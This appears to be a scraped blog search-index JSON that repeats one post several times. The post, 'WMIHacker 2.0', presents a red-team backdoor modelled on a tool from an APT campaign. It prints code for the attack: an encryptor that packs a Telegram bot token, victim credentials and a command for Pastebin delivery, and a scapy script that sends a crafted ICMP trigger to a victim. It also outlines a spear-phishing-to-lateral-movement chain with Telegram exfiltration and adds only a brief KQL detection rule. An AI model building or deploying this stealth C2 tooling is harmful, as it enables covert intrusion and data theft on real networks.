Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo:\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often 